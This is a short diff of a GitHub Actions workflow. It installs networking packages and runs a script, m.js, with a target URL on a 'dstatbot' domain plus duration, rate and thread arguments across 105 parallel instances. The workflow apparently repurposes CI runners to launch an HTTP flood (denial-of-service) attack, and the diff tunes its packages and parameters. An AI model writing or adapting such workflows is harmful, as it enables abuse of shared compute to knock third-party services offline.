@@ -27,10 +27,10 @@ jobs:
           # cache: 'npm'
       
       - name: Install dependencies
-        run: npm install net http2 http tls cluster url crypto hpack.js fs os colors
+        run: npm install net chalk hpack.js 
       
       - name: Run m.js
-        run: node m.js GET https://c2.dstatbot.win/Oi2kPkBO 400 10 1000 --full
+        run: node m.js GET https://c2.dstatbot.win/kizOYY5m 400 10 500 --full --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 105
